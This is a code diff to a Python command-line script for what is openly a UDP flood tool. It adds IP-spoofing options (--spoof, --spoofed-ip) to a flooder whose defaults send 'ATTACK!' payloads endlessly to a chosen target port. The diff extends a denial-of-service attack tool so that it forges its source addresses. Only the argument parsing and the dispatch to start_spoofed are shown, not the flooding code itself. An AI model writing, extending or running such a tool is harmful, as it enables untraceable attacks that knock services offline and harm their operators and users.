@@ -15,6 +15,8 @@ def main():
     parser.add_argument("-tp", "--target-port", type=int, help="The target port number to flood (e.g., 80 or 53)")
     parser.add_argument("-m", "--message", type=str, default="ATTACK!", help="The message payload to send in each UDP packet.\nDefault: 'ATTACK!'")
     parser.add_argument("-c", "--count", type=int, default=-1, help="Number of packets to send. Use -1 for infinite (default).")
+    parser.add_argument("-s", "--spoof", action="store_true", help="Enable IP spoofing for the flood.")
+    parser.add_argument("-si", "--spoofed-ip", type=str, default="192.168.1.100", help="The source IP address to spoof. Default: 192.168.1.100")
 
     args = parser.parse_args()
 
@@ -25,7 +27,12 @@ def main():
             message=args.message
         )
         
-        flooder.start(packet_count=args.count)
+        # Check if spoofing is enabled and call the appropriate method
+        if args.spoof:
+            print(f"[i] IP spoofing enabled. Using source IP: {args.spoofed_ip}")
+            flooder.start_spoofed(packet_count=args.count, spoofed_ip=args.spoofed_ip)
+        else:
+            flooder.start(packet_count=args.count)
 
     except ValueError as ve:
         print(f"[!] Configuration Error: {ve}")
